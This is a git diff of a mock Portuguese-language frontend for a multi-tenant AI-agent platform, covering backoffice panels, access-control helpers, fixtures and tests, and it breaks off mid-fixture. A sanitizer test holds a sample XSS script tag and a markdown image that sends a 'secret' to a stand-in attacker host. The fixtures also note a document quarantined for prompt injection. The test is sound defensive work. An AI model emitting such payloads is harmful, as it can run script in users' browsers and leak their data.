++                  <code>{conn.credentialVaultRef}</code>
++                </div>
++              </li>
++            ))}
++          </ul>
++        </div>
++
++        <div className="item-card">
++          <h3>Documentos &amp; Indexação RAG do Tenant</h3>
++          <ul className="item-list">
++            {MOCK_RAG_DOCUMENTS.map((doc) => (
++              <li
++                key={doc.id}
++                style={{
++                  fontSize: "0.84rem",
++                  paddingBottom: "0.4rem",
++                  borderBottom: "1px solid var(--border-subtle)",
++                }}
++              >
++                <div
++                  style={{
++                    display: "flex",
++                    justifyContent: "space-between",
++                    alignItems: "center",
++                    gap: "0.5rem",
++                  }}
++                >
++                  <strong>{doc.title}</strong>
++                  <span
++                    className={
++                      doc.status === "INDEXED"
++                        ? "demo-badge demo-badge--ok"
++                        : doc.status === "INDEXING"
++                          ? "demo-badge demo-badge--warn"
++                          : "demo-badge demo-badge--danger"
++                    }
++                  >
++                    {doc.status}
++                  </span>
++                </div>
++                <div
++                  style={{
++                    fontSize: "0.76rem",
++                    color: "var(--text-secondary)",
++                  }}
++                >
++                  {doc.departmentName} · {doc.chunksCount} chunks · {doc.updatedAtLabel}
++                </div>
++              </li>
++            ))}
++          </ul>
++        </div>
++      </div>
++    </section>
++  );
++}
+diff --git a/apps/web/app/components/PlatformBackofficePanel.tsx b/apps/web/app/components/PlatformBackofficePanel.tsx
+new file mode 100644
+index 0000000..4b054ca
+--- /dev/null
++++ b/apps/web/app/components/PlatformBackofficePanel.tsx
+@@ -0,0 +1,294 @@
++"use client";
++
++import { useState } from "react";
++import { MOCK_SESSION_ACTORS, resolvePlatformBackoffice } from "../../lib/mock-enterprise-data.ts";
++
++export function PlatformBackofficePanel() {
++  const [actorId, setActorId] = useState<string>("usr-roberto-admin-03");
++  const [killSwitchedTenants, setKillSwitchedTenants] = useState<readonly string[]>([
++    "vanguarda-agro",
++  ]);
++  const [dlqJustification, setDlqJustification] = useState<string>(
++    "Reprocessar após normalização de latência do gateway upstream.",
++  );
++  const [requeuedJobs, setRequeuedJobs] = useState<readonly string[]>([]);
++  const [auditFeedback, setAuditFeedback] = useState<string | null>(null);
++
++  const actor =
++    MOCK_SESSION_ACTORS.find((item) => item.id === actorId) ?? MOCK_SESSION_ACTORS[0] ?? null;
++
++  const backoffice = resolvePlatformBackoffice(actor);
++
++  function handleToggleKillSwitch(slug: string): void {
++    const isCurrentlyActive = killSwitchedTenants.includes(slug);
++    const next = isCurrentlyActive
++      ? killSwitchedTenants.filter((item) => item !== slug)
++      : [...killSwitchedTenants, slug];
++
++    setKillSwitchedTenants(next);
++    setAuditFeedback(
++      `Auditoria /platform: Kill switch de orçamento para "${slug}" alterado para ${!isCurrentlyActive ? "ATIVADO" : "DESATIVADO"} por ${actor?.email ?? "operador"}.`,
++    );
++  }
++
++  function handleRequeueDlq(jobId: string): void {
++    if (dlqJustification.trim().length < 10) {
++      setAuditFeedback(
++        "Erro de validação: Requeue de DLQ exige justificativa auditável com pelo menos 10 caracteres.",
++      );
++      return;
++    }
++    setRequeuedJobs((prev) => (prev.includes(jobId) ? prev : [...prev, jobId]));
++    setAuditFeedback(
++      `Auditoria /platform: Job ${jobId} reenfileirado com justificativa: "${dlqJustification.trim()}".`,
++    );
++  }
++
++  return (
++    <section className="panel-card" aria-labelledby="platform-backoffice-heading">
++      <div className="panel-header">
++        <div>
++          <h2 id="platform-backoffice-heading">
++            Backoffice de Plataforma — <code>/platform</code> (WEB-009)
++          </h2>
++          <p
++            style={{
++              margin: "0.25rem 0 0",
++              fontSize: "0.86rem",
++              color: "var(--text-secondary)",
++            }}
++          >
++            Exclusivo para <code>platform_admin</code> com MFA. Exibe apenas metadados operacionais,
++            provisionamento, DLQ, capacidade e break-glass — <strong>jamais</strong> conteúdo
++            privado de conversas ou documentos do tenant.
++          </p>
++        </div>
++
++        <div className="control-group">
++          <label htmlFor="backoffice-actor-select">Testar acesso a /platform com papel</label>
++          <select
++            id="backoffice-actor-select"
++            className="control-select"
++            value={actorId}
++            onChange={(e) => {
++              setActorId(e.target.value);
++              setAuditFeedback(null);
++            }}
++          >
++            {MOCK_SESSION_ACTORS.map((item) => (
++              <option key={item.id} value={item.id}>
++                {item.displayName} ({item.platformRole})
++              </option>
++            ))}
++          </select>
++        </div>
++      </div>
++
++      {!backoffice.allowed ? (
++        <div role="alert" className="state-box state-box--error" style={{ marginTop: "0.5rem" }}>
++          <span className="demo-badge demo-badge--danger">
++            HTTP {backoffice.httpStatus} FORBIDDEN
++          </span>
++          <h3 style={{ marginTop: "0.5rem" }}>Acesso bloqueado à área /platform (WEB-009 AC-1)</h3>
++          <p>{backoffice.denialReason}</p>
++        </div>
++      ) : (
++        <>
++          <div className="kpi-grid" style={{ marginBottom: "1.25rem" }}>
++            <div className="kpi-card">
++              <span className="kpi-card__label">Host VPS do MVP</span>
++              <span className="kpi-card__value">
++                {backoffice.hostCapacity.activeTenantsCount} /{" "}
++                {backoffice.hostCapacity.maxTenantsMvp} tenants
++              </span>
++              <span className="kpi-card__detail">{backoffice.hostCapacity.vpsNodeLabel}</span>
++            </div>
++            <div className="kpi-card">
++              <span className="kpi-card__label">Memória RAM do Host</span>
++              <span className="kpi-card__value">
++                {backoffice.hostCapacity.ramUsedGb} GB / {backoffice.hostCapacity.ramTotalGb} GB
++              </span>
++              <span className="kpi-card__detail">
++                CPU: {backoffice.hostCapacity.cpuUsagePct}% · Disco NVMe:{" "}
++                {backoffice.hostCapacity.diskUsedPct}%
++              </span>
++            </div>
++          </div>
++
++          <div className="two-col-grid">
++            <div className="item-card">
++              <h3>Tenants, Custos, Deriva &amp; Kill Switch de Orçamento</h3>
++              <ul className="item-list">
++                {backoffice.tenants.map((tnt) => {
++                  const killActive = killSwitchedTenants.includes(tnt.slug);
++                  return (
++                    <li
++                      key={tnt.tenantId}
++                      style={{
++                        paddingBottom: "0.6rem",
++                        borderBottom: "1px solid var(--border-subtle)",
++                        fontSize: "0.84rem",
++                      }}
++                    >
++                      <div
++                        style={{
++                          display: "flex",
++                          justifyContent: "space-between",
++                          alignItems: "center",
++                          gap: "0.5rem",
++                        }}
++                      >
++                        <div>
++                          <strong>{tnt.slug}</strong> ({tnt.state}) · {tnt.activeContainers}{" "}
++                          containers
++                        </div>
++                        <span
++                          className={
++                            tnt.reconcilerDrift === "NONE"
++                              ? "demo-badge demo-badge--ok"
++                              : "demo-badge demo-badge--warn"
++                          }
++                        >
++                          Drift: {tnt.reconcilerDrift}
++                        </span>
++                      </div>
++                      <div
++                        style={{
++                          display: "flex",
++                          justifyContent: "space-between",
++                          alignItems: "center",
++                          marginTop: "0.35rem",
++                          gap: "0.5rem",
++                        }}
++                      >
++                        <span>
++                          Custo IA: R$ {tnt.monthlyCostBrl} / R$ {tnt.monthlyCapBrl}
++                        </span>
++                        <button
++                          type="button"
++                          className={killActive ? "btn btn--approve" : "btn btn--reject"}
++                          onClick={() => {
++                            handleToggleKillSwitch(tnt.slug);
++                          }}
++                        >
++                          {killActive
++                            ? "Reativar Orçamento (Kill Switch ON)"
++                            : "Acionar Kill Switch de Orçamento"}
++                        </button>
++                      </div>
++                    </li>
++                  );
++                })}
++              </ul>
++            </div>
++
++            <div className="item-card">
++              <h3>Fila DLQ &amp; Requeue com Justificativa Auditada</h3>
++              <div className="control-group" style={{ marginBottom: "0.6rem" }}>
++                <label htmlFor="dlq-justification-input">
++                  Justificativa obrigatória para Requeue
++                </label>
++                <input
++                  id="dlq-justification-input"
++                  type="text"
++                  className="control-input"
++                  value={dlqJustification}
++                  onChange={(e) => {
++                    setDlqJustification(e.target.value);
++                  }}
++                />
++              </div>
++
++              <ul className="item-list">
++                {backoffice.dlqItems.map((dlq) => {
++                  const isRequeued = requeuedJobs.includes(dlq.jobId);
++                  return (
++                    <li
++                      key={dlq.jobId}
++                      style={{
++                        paddingBottom: "0.5rem",
++                        borderBottom: "1px solid var(--border-subtle)",
++                        fontSize: "0.83rem",
++                      }}
++                    >
++                      <div>
++                        <code>{dlq.jobId}</code> · Tenant: <strong>{dlq.tenantSlug}</strong> (
++                        {dlq.queueName})
++                      </div>
++                      <div style={{ color: "var(--text-secondary)" }}>
++                        Erro: <code>{dlq.failureCode}</code> ({dlq.retriesCount} tentativas ·{" "}
++                        {dlq.occurredAtLabel})
++                      </div>
++                      <div style={{ marginTop: "0.35rem" }}>
++                        {isRequeued ? (
++                          <span className="demo-badge demo-badge--ok">
++                            Reenfileirado com auditoria
++                          </span>
++                        ) : (
++                          <button
++                            type="button"
++                            className="btn btn--secondary"
++                            onClick={() => {
++                              handleRequeueDlq(dlq.jobId);
++                            }}
++                          >
++                            Requeue com Justificativa
++                          </button>
++                        )}
++                      </div>
++                    </li>
++                  );
++                })}
++              </ul>
++            </div>
++
++            <div className="item-card">
++              <h3>Execuções de Provisionamento</h3>
++              <ul className="item-list">
++                {backoffice.provisioningRuns.map((run) => (
++                  <li key={run.executionId} style={{ fontSize: "0.84rem" }}>
++                    <strong>{run.executionId}</strong> ({run.tenantSlug}) —{" "}
++                    <span className="demo-badge demo-badge--info">{run.status}</span>
++                    <div style={{ color: "var(--text-secondary)" }}>
++                      {run.currentStep} ({run.stepsCompleted}/{run.totalSteps})
++                    </div>
++                  </li>
++                ))}
++              </ul>
++            </div>
++
++            <div className="item-card">
++              <h3>Concessões Break-Glass (Somente Metadados — IAM-009)</h3>
++              <ul className="item-list">
++                {backoffice.breakGlassGrants.map((bg) => (
++                  <li key={bg.grantId} style={{ fontSize: "0.84rem" }}>
++                    <div>
++                      <code>{bg.grantId}</code> · Tenant: <strong>{bg.tenantSlug}</strong> ·{" "}
++                      <span className="demo-badge demo-badge--warn">{bg.status}</span>
++                    </div>
++                    <div style={{ color: "var(--text-secondary)" }}>
++                      Motivo: {bg.reason} ({bg.expiresAtLabel})
++                    </div>
++                  </li>
++                ))}
++              </ul>
++            </div>
++          </div>
++        </>
++      )}
++
++      {auditFeedback ? (
++        <p
++          role="status"
++          style={{
++            marginTop: "0.75rem",
++            fontSize: "0.82rem",
++            color: "var(--status-warn-text)",
++          }}
++        >
++          {auditFeedback}
++        </p>
++      ) : null}
++    </section>
++  );
++}
 diff --git a/apps/web/app/dashboard-mock.test.ts b/apps/web/app/dashboard-mock.test.ts
 new file mode 100644
-index 0000000..e3ac782
+index 0000000..a5d7145
 --- /dev/null
 +++ b/apps/web/app/dashboard-mock.test.ts
-@@ -0,0 +1,108 @@
+@@ -0,0 +1,197 @@
 +import assert from "node:assert/strict";
 +import { describe, test } from "node:test";
++import {
++  generateOrganizationUsageCsv,
++  MOCK_SESSION_ACTORS,
++  resolvePlatformBackoffice,
++  resolveTenantRouteAccess,
++} from "../lib/mock-enterprise-data.ts";
++import {
++  createIdempotencyKey,
++  registerIdempotentMutation,
++  sanitizeAgentMessageContent,
++} from "../lib/mock-security.ts";
 +import {
 +  computeBudgetStatus,
 +  deriveDashboardViewModel,
@@ -1064,7 +2332,7 @@ index 0000000..e3ac782
 +  roleCanDecideApprovals,
 +} from "../lib/mock-selectors.ts";
 +
-+describe("LOC-WEB-001 — Modelo e transformações do frontend mockado", () => {
++describe("LOC-WEB-001 — Modelo e transformações do frontend mockado (EP-10 sem 3D)", () => {
 +  test("WEB-MOCK-AC-01: expõe organizações mockadas e banner explícito de demonstração", () => {
 +    const orgs = listMockOrganizations();
 +    assert.equal(orgs.length, 2);
@@ -1102,7 +2370,7 @@ index 0000000..e3ac782
 +    assert.equal(vm.metrics.totalBudget.percentage, 73);
 +  });
 +
-+  test("WEB-MOCK-AC-03: ordena andares do topo ao térreo e filtra agentes por andar e busca", () => {
++  test("WEB-MOCK-AC-03: ordena departamentos e filtra agentes por departamento e busca", () => {
 +    const vm = deriveDashboardViewModel({ orgSlug: "aurora-industrial" });
 +    assert.deepEqual(
 +      vm.floors.map((f) => f.floorNumber),
@@ -1160,6 +2428,84 @@ index 0000000..e3ac782
 +
 +    const fallbackOrg = getMockOrganizationBySlug("slug-inexistente");
 +    assert.equal(fallbackOrg.slug, "aurora-industrial");
++  });
++
++  test("WEB-001 (mock): acessar /orgs/<slug-de-B> não pertencente à sessão retorna 404 sem vazar dados", () => {
++    const marina = MOCK_SESSION_ACTORS[0] ?? null;
++    const allowedRes = resolveTenantRouteAccess(marina, "aurora-industrial");
++    assert.equal(allowedRes.allowed, true);
++    assert.equal(allowedRes.httpStatus, 200);
++    assert.equal(allowedRes.organization?.slug, "aurora-industrial");
++
++    const forbiddenCrossTenant = resolveTenantRouteAccess(marina, "titan-defesa");
++    assert.equal(forbiddenCrossTenant.allowed, false);
++    assert.equal(forbiddenCrossTenant.httpStatus, 404);
++    assert.equal(forbiddenCrossTenant.organization, null);
++
++    const unauthRes = resolveTenantRouteAccess(null, "aurora-industrial");
++    assert.equal(unauthRes.allowed, false);
++    assert.equal(unauthRes.httpStatus, 401);
++  });
++
++  test("WEB-002 (mock): idempotency key bloqueia mutação repetida (duplo clique)", () => {
++    const key = createIdempotencyKey("agt-fin-01", "lote-442", "approve");
++    assert.equal(key, "idem-agt-fin-01:lote-442:approve");
++
++    const firstAttempt = registerIdempotentMutation([], "agt-fin-01", "lote-442", "approve");
++    assert.equal(firstAttempt.allowed, true);
++
++    const secondAttempt = registerIdempotentMutation(
++      firstAttempt.updatedKeys,
++      "agt-fin-01",
++      "lote-442",
++      "approve",
++    );
++    assert.equal(secondAttempt.allowed, false);
++    assert.equal(secondAttempt.idempotencyKey, firstAttempt.idempotencyKey);
++  });
++
++  test("WEB-003 (mock): exporta CSV de consumo consistente com token_usage das fixtures", () => {
++    const csv = generateOrganizationUsageCsv("aurora-industrial");
++    assert.match(
++      csv,
++      /^organizacao,departamento,modulo,agente,modelo,tokens_usados_mes,tokens_limite_mes,gasto_mensal_brl,orcamento_mensal_brl/m,
++    );
++    assert.match(
++      csv,
++      /"aurora-industrial","Finanças & Controladoria","MOD-FIN-CORE","Helena \(Conciliação\)"/,
++    );
++  });
++
++  test("WEB-008 (mock): sanitiza payload XSS e bloqueia imagem remota automática em resposta de agente", () => {
++    const malicious =
++      "Parecer pronto.\n<script>alert('xss')</script>\n![tracker](https://evil.example/track.png?secret=1)";
++    const result = sanitizeAgentMessageContent(malicious);
++
++    assert.equal(result.blockedXssCount, 2);
++    assert.deepEqual(result.blockedRemoteImages, ["https://evil.example/track.png?secret=1"]);
++    assert.ok(
++      result.safeSegments.some((s) => s.kind === "blocked_xss"),
++      "Deve marcar o segmento XSS como bloqueado",
++    );
++    assert.ok(
++      result.safeSegments.some((s) => s.kind === "blocked_remote_image"),
++      "Deve reter imagem remota em placeholder sem carregá-la",
++    );
++  });
++
++  test("WEB-009 (mock): usuário comum de tenant recebe 403 em /platform e platform_admin vê apenas metadados", () => {
++    const tenantUser = MOCK_SESSION_ACTORS[0] ?? null;
++    const denied = resolvePlatformBackoffice(tenantUser);
++    assert.equal(denied.allowed, false);
++    assert.equal(denied.httpStatus, 403);
++    assert.equal(denied.tenants.length, 0);
++
++    const platformAdmin = MOCK_SESSION_ACTORS[2] ?? null;
++    const granted = resolvePlatformBackoffice(platformAdmin);
++    assert.equal(granted.allowed, true);
++    assert.equal(granted.httpStatus, 200);
++    assert.equal(granted.tenants.length, 5);
++    assert.equal(granted.dlqItems.length, 2);
 +  });
 +});
 diff --git a/apps/web/app/globals.css b/apps/web/app/globals.css
@@ -1719,6 +3065,28 @@ index a388277..0b16378 100644
  
  export default function RootLayout({ children }: { children: ReactNode }) {
    return (
+diff --git a/apps/web/app/login/page.tsx b/apps/web/app/login/page.tsx
+new file mode 100644
+index 0000000..120beff
+--- /dev/null
++++ b/apps/web/app/login/page.tsx
+@@ -0,0 +1,5 @@
++import { DashboardClientShell } from "../components/DashboardClientShell.tsx";
++
++export default function LoginMockPage() {
++  return <DashboardClientShell initialSection="auth" />;
++}
+diff --git a/apps/web/app/orgs/page.tsx b/apps/web/app/orgs/page.tsx
+new file mode 100644
+index 0000000..2202baa
+--- /dev/null
++++ b/apps/web/app/orgs/page.tsx
+@@ -0,0 +1,5 @@
++import { DashboardClientShell } from "../components/DashboardClientShell.tsx";
++
++export default function OrgsMockPage() {
++  return <DashboardClientShell initialSection="auth" />;
++}
 diff --git a/apps/web/app/page.tsx b/apps/web/app/page.tsx
 index 4a73280..f4309ed 100644
 --- a/apps/web/app/page.tsx
@@ -1730,6 +3098,655 @@ index 4a73280..f4309ed 100644
 -  return <main>Nucleos Enterprise</main>;
 +  return <DashboardClientShell />;
  }
+diff --git a/apps/web/app/platform/page.tsx b/apps/web/app/platform/page.tsx
+new file mode 100644
+index 0000000..2678938
+--- /dev/null
++++ b/apps/web/app/platform/page.tsx
+@@ -0,0 +1,5 @@
++import { DashboardClientShell } from "../components/DashboardClientShell.tsx";
++
++export default function PlatformBackofficeMockPage() {
++  return <DashboardClientShell initialSection="platform" />;
++}
+diff --git a/apps/web/lib/mock-enterprise-data.ts b/apps/web/lib/mock-enterprise-data.ts
+new file mode 100644
+index 0000000..72b2d17
+--- /dev/null
++++ b/apps/web/lib/mock-enterprise-data.ts
+@@ -0,0 +1,632 @@
++/**
++ * Dados mockados e seletores determinísticos para os fluxos completos do EP-10
++ * (WEB-001, WEB-002, WEB-003, WEB-004, WEB-008 e WEB-009 — exceto prédio 3D).
++ */
++
++import { getMockOrganizationBySlug } from "./mock-selectors.ts";
++import { buildOrganizationUsageCsv, type DepartmentUsageCsvRow } from "./mock-security.ts";
++import type { MockOrganizationFixture, UserRole } from "./mock-types.ts";
++
++export type PlatformOrTenantRole = UserRole | "platform_admin";
++
++export interface MockSessionActor {
++  readonly id: string;
++  readonly displayName: string;
++  readonly email: string;
++  readonly platformRole: PlatformOrTenantRole;
++  readonly mfaVerified: boolean;
++  readonly authorizedOrgSlugs: readonly string[];
++}
++
++export interface TenantRouteResolution {
++  readonly allowed: boolean;
++  readonly httpStatus: 200 | 401 | 404;
++  readonly organization: MockOrganizationFixture | null;
++  readonly safeMessage: string;
++}
++
++export interface MockOrgMember {
++  readonly id: string;
++  readonly name: string;
++  readonly email: string;
++  readonly role: UserRole;
++  readonly mfaEnabled: boolean;
++  readonly lastSeenLabel: string;
++}
++
++export interface MockEntitlementModule {
++  readonly moduleCode: string;
++  readonly name: string;
++  readonly maxAgents: number;
++  readonly activeAgents: number;
++  readonly monthlyQuotaTokens: number;
++  readonly status: "ACTIVE" | "PROVISIONING";
++}
++
++export interface MockIntegrationMetadata {
++  readonly id: string;
++  readonly name: string;
++  readonly category: string;
++  readonly egressDomain: string;
++  readonly credentialVaultRef: string;
++  readonly status: "HEALTHY" | "RATE_LIMITED" | "BLOCKED_BY_POLICY";
++}
++
++export interface MockRagDocument {
++  readonly id: string;
++  readonly title: string;
++  readonly departmentName: string;
++  readonly status: "INDEXED" | "INDEXING" | "QUARANTINED_INJECTION";
++  readonly chunksCount: number;
++  readonly updatedAtLabel: string;
++}
++
++export interface MockAgentToolStep {
++  readonly stepId: string;
++  readonly toolName: string;
++  readonly policyDecision: "ALLOW" | "REQUIRE_APPROVAL" | "DENY";
++  readonly durationMs: number;
++  readonly summary: string;
++}
++
++export interface MockDocumentCitation {
++  readonly documentId: string;
++  readonly documentTitle: string;
++  readonly sectionLabel: string;
++}
++
++export interface MockChatMessage {
++  readonly id: string;
++  readonly sender: "user" | "agent";
++  readonly authorLabel: string;
++  readonly timestampLabel: string;
++  readonly rawContent: string;
++  readonly toolSteps: readonly MockAgentToolStep[];
++  readonly citations: readonly MockDocumentCitation[];
++  readonly costTokens: number;
++}
++
++export interface MockAgentConversation {
++  readonly agentId: string;
++  readonly agentName: string;
++  readonly departmentName: string;
++  readonly modelName: string;
++  readonly messages: readonly MockChatMessage[];
++}
++
++export interface MockPlatformTenantMetadata {
++  readonly tenantId: string;
++  readonly slug: string;
++  readonly state: "ACTIVE" | "PROVISIONING" | "SUSPENDED";
++  readonly monthlyCostBrl: number;
++  readonly monthlyCapBrl: number;
++  readonly killSwitchActive: boolean;
++  readonly reconcilerDrift: "NONE" | "MINOR_DRIFT";
++  readonly activeContainers: number;
++}
++
++export interface MockProvisioningExecution {
++  readonly executionId: string;
++  readonly tenantSlug: string;
++  readonly currentStep: string;
++  readonly status: "COMPLETED" | "IN_PROGRESS" | "COMPENSATED_SAFE_FAIL";
++  readonly stepsCompleted: number;
++  readonly totalSteps: number;
++  readonly updatedAtLabel: string;
++}
++
++export interface MockDlqItem {
++  readonly jobId: string;
++  readonly tenantSlug: string;
++  readonly queueName: string;
++  readonly failureCode: string;
++  readonly retriesCount: number;
++  readonly occurredAtLabel: string;
++}
++
++export interface MockBreakGlassGrant {
++  readonly grantId: string;
++  readonly tenantSlug: string;
++  readonly requestedBy: string;
++  readonly reason: string;
++  readonly status: "PENDING_SECOND_APPROVER" | "ACTIVE_READONLY_METADATA" | "EXPIRED";
++  readonly expiresAtLabel: string;
++}
++
++export interface PlatformBackofficeViewModel {
++  readonly allowed: boolean;
++  readonly httpStatus: 200 | 403;
++  readonly denialReason: string | null;
++  readonly hostCapacity: {
++    readonly vpsNodeLabel: string;
++    readonly activeTenantsCount: number;
++    readonly maxTenantsMvp: number;
++    readonly cpuUsagePct: number;
++    readonly ramUsedGb: number;
++    readonly ramTotalGb: number;
++    readonly diskUsedPct: number;
++  };
++  readonly tenants: readonly MockPlatformTenantMetadata[];
++  readonly provisioningRuns: readonly MockProvisioningExecution[];
++  readonly dlqItems: readonly MockDlqItem[];
++  readonly breakGlassGrants: readonly MockBreakGlassGrant[];
++}
++
++export const MOCK_SESSION_ACTORS: readonly MockSessionActor[] = [
++  {
++    id: "usr-marina-01",
++    displayName: "Marina Costa (Admin Aurora / Viewer Vereda)",
++    email: "marina.costa@aurora-demo.example",
++    platformRole: "org_admin",
++    mfaVerified: true,
++    authorizedOrgSlugs: ["aurora-industrial", "vereda-logistica"],
++  },
++  {
++    id: "usr-carlos-02",
++    displayName: "Carlos Mendes (Somente Viewer Vereda)",
++    email: "carlos.mendes@vereda-demo.example",
++    platformRole: "viewer",
++    mfaVerified: true,
++    authorizedOrgSlugs: ["vereda-logistica"],
++  },
++  {
++    id: "usr-roberto-admin-03",
++    displayName: "Roberto Almeida (Platform Admin · Backoffice)",
++    email: "roberto.sre@nucleos-platform.example",
++    platformRole: "platform_admin",
++    mfaVerified: true,
++    authorizedOrgSlugs: ["aurora-industrial", "vereda-logistica"],
++  },
++];
++
++/**
++ * Valida acesso de sessao ao slug de organizacao solicitado (WEB-001 AC-2).
++ * Se o usuario nao pertencer a organizacao (ex.: "titan-defesa"), retorna 404
++ * sem expor nenhum dado da organizacao B.
++ */
++export function resolveTenantRouteAccess(
++  actor: MockSessionActor | null,
++  requestedOrgSlug: string,
++): TenantRouteResolution {
++  if (!actor || !actor.mfaVerified) {
++    return {
++      allowed: false,
++      httpStatus: 401,
++      organization: null,
++      safeMessage: "Sessão não autenticada ou desafio MFA pendente. Redirecionando para /login.",
++    };
++  }
++
++  const normalizedSlug = requestedOrgSlug.trim().toLowerCase();
++  const isMember = actor.authorizedOrgSlugs.includes(normalizedSlug);
++
++  if (!isMember) {
++    return {
++      allowed: false,
++      httpStatus: 404,
++      organization: null,
++      safeMessage:
++        "Recurso ou organização não encontrada (HTTP 404). Nenhum metadado de terceiros é revelado.",
++    };
++  }
++
++  const org = getMockOrganizationBySlug(normalizedSlug);
++  if (org.slug !== normalizedSlug) {
++    return {
++      allowed: false,
++      httpStatus: 404,
++      organization: null,
++      safeMessage:
++        "Recurso ou organização não encontrada (HTTP 404). Nenhum metadado de terceiros é revelado.",
++    };
++  }
++
++  return {
++    allowed: true,
++    httpStatus: 200,
++    organization: org,
++    safeMessage: "Acesso autorizado à organização ativa.",
++  };
++}
++
++export const MOCK_ORG_MEMBERS: readonly MockOrgMember[] = [
++  {
++    id: "mem-01",
++    name: "Marina Costa",
++    email: "marina.costa@aurora-demo.example",
++    role: "org_admin",
++    mfaEnabled: true,
++    lastSeenLabel: "Online agora",
++  },
++  {
++    id: "mem-02",
++    name: "Eduardo Nogueira",
++    email: "eduardo.fin@aurora-demo.example",
++    role: "department_manager",
++    mfaEnabled: true,
++    lastSeenLabel: "há 14 min",
++  },
++  {
++    id: "mem-03",
++    name: "Patrícia Lemos",
++    email: "patricia.jur@aurora-demo.example",
++    role: "operator",
++    mfaEnabled: true,
++    lastSeenLabel: "há 42 min",
++  },
++  {
++    id: "mem-04",
++    name: "Carlos Mendes",
++    email: "carlos.auditoria@aurora-demo.example",
++    role: "viewer",
++    mfaEnabled: true,
++    lastSeenLabel: "ontem às 18:10",
++  },
++];
++
++export const MOCK_ENTITLEMENTS: readonly MockEntitlementModule[] = [
++  {
++    moduleCode: "MOD-FIN-CORE",
++    name: "Finanças & Controladoria",
++    maxAgents: 4,
++    activeAgents: 2,
++    monthlyQuotaTokens: 5000000,
++    status: "ACTIVE",
++  },
++  {
++    moduleCode: "MOD-JUR-LGPD",
++    name: "Jurídico & Privacidade LGPD",
++    maxAgents: 3,
++    activeAgents: 2,
++    monthlyQuotaTokens: 4000000,
++    status: "ACTIVE",
++  },
++  {
++    moduleCode: "MOD-OPS-SUPPLY",
++    name: "Operações & Suprimentos",
++    maxAgents: 4,
++    activeAgents: 2,
++    monthlyQuotaTokens: 3500000,
++    status: "ACTIVE",
++  },
++  {
++    moduleCode: "MOD-CX-FRONT",
++    name: "Recepção & Triagem Digital",
++    maxAgents: 2,
++    activeAgents: 1,
++    monthlyQuotaTokens: 2500000,
++    status: "ACTIVE",
++  },
++];
++
++export const MOCK_INTEGRATIONS: readonly MockIntegrationMetadata[] = [
++  {
++    id: "int-sap-01",
++    name: "ERP Industrial (Conector HTTP Seguro)",
++    category: "ERP / Financeiro",
++    egressDomain: "api.erp-homologado.aurora.example",
++    credentialVaultRef: "vault://tenant-aurora/erp-oauth-client (redigido)",
++    status: "HEALTHY",
++  },
++  {
++    id: "int-sefaz-02",
++    name: "Validador NFe / Manifesto Fiscal",
++    category: "Fiscal",
++    egressDomain: "nfe.fazenda.gov.br",
++    credentialVaultRef: "vault://tenant-aurora/cert-a1-mtls (redigido)",
++    status: "HEALTHY",
++  },
++  {
++    id: "int-webhook-03",
++    name: "Domínio Externo Não Catalogado",
++    category: "Bloqueio de Egress (TGW-005)",
++    egressDomain: "untrusted-webhook.external.example",
++    credentialVaultRef: "Nenhuma credencial associada",
++    status: "BLOCKED_BY_POLICY",
++  },
++];
++
++export const MOCK_RAG_DOCUMENTS: readonly MockRagDocument[] = [
++  {
++    id: "doc-rag-01",
++    title: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
++    departmentName: "Finanças & Controladoria",
++    status: "INDEXED",
++    chunksCount: 42,
++    updatedAtLabel: "2026-10-28 09:15",
++  },
++  {
++    id: "doc-rag-02",
++    title: "Manual de Cláusulas Padrão DPA e Suboperadores LGPD.docx",
++    departmentName: "Jurídico & Privacidade LGPD",
++    status: "INDEXED",
++    chunksCount: 68,
++    updatedAtLabel: "2026-10-29 16:40",
++  },
++  {
++    id: "doc-rag-03",
++    title: "Tabela_Frete_Sul_Q4_2026.csv",
++    departmentName: "Operações & Suprimentos",
++    status: "INDEXING",
++    chunksCount: 19,
++    updatedAtLabel: "há 6 min",
++  },
++  {
++    id: "doc-rag-04",
++    title: "Anexo_Externo_Com_Instrucao_Suspeita.txt",
++    departmentName: "Recepção & Triagem Digital",
++    status: "QUARANTINED_INJECTION",
++    chunksCount: 0,
++    updatedAtLabel: "Retido pela defesa RAG-003 / TGW-006",
++  },
++];
++
++export const MOCK_AGENT_CONVERSATIONS: readonly MockAgentConversation[] = [
++  {
++    agentId: "agt-fin-01",
++    agentName: "Helena (Conciliação)",
++    departmentName: "Finanças & Controladoria",
++    modelName: "claude-3-7-sonnet",
++    messages: [
++      {
++        id: "msg-01",
++        sender: "user",
++        authorLabel: "Marina Costa",
++        timestampLabel: "14:12",
++        rawContent:
++          "Helena, confira se os 6 boletos do lote BR-442 possuem nota fiscal validada e se o valor bate com a alçada.",
++        toolSteps: [],
++        citations: [],
++        costTokens: 180,
++      },
++      {
++        id: "msg-02",
++        sender: "agent",
++        authorLabel: "Helena (Conciliação)",
++        timestampLabel: "14:13",
++        rawContent:
++          "Conferi os 6 documentos fiscais do lote BR-442. Todos possuem chave NFe ativa e somam R$ 48.200,00.\n`SELECT lote, total_brl, status_nfe FROM conciliacao_outubro WHERE lote = 'BR-442'`\nComo o total supera R$ 25.000,00, a Política de Alçadas exige aprovação humana explícita no painel HITL antes da emissão bancária.",
++        toolSteps: [
++          {
++            stepId: "stp-01",
++            toolName: "tenant_db.query_readonly_invoices",
++            policyDecision: "ALLOW",
++            durationMs: 84,
++            summary: "Leitura de 6 notas fiscais homologadas no schema do tenant",
++          },
++          {
++            stepId: "stp-02",
++            toolName: "erp_connector.schedule_payment_batch",
++            policyDecision: "REQUIRE_APPROVAL",
++            durationMs: 19,
++            summary: "Retido pelo Tool Gateway: valor acima de R$ 25.000 exige aprovação #apr-301",
++          },
++        ],
++        citations: [
++          {
++            documentId: "doc-rag-01",
++            documentTitle: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
++            sectionLabel: "Seção 3.2 — Dupla aprovação acima de R$ 25 mil",
++          },
++        ],
++        costTokens: 1420,
++      },
++    ],
++  },
++  {
++    agentId: "agt-jur-01",
++    agentName: "Clara (Minutas)",
++    departmentName: "Jurídico & Privacidade LGPD",
++    modelName: "claude-3-7-sonnet",
++    messages: [
++      {
++        id: "msg-10",
++        sender: "user",
++        authorLabel: "Patrícia Lemos",
++        timestampLabel: "13:45",
++        rawContent:
++          "Clara, o anexo enviado pela transportadora externa tinha algum trecho suspeito?",
++        toolSteps: [],
++        citations: [],
++        costTokens: 140,
++      },
++      {
++        id: "msg-11",
++        sender: "agent",
++        authorLabel: "Clara (Minutas)",
++        timestampLabel: "13:46",
++        rawContent:
